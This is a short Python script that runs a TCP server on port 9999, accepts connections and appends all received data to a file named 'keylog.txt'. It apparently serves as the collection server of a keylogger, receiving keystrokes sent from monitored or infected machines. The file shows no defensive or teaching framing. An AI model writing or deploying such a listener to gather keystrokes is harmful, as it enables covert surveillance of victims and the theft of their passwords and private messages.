import socket

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))
    server_socket.listen(5)
    print("Server started on port 9999")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")
        with open("keylog.txt", "a") as log_file:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                log_file.write(data.decode("utf-8"))
        client_socket.close()

if __name__ == "__main__":
    start_server()
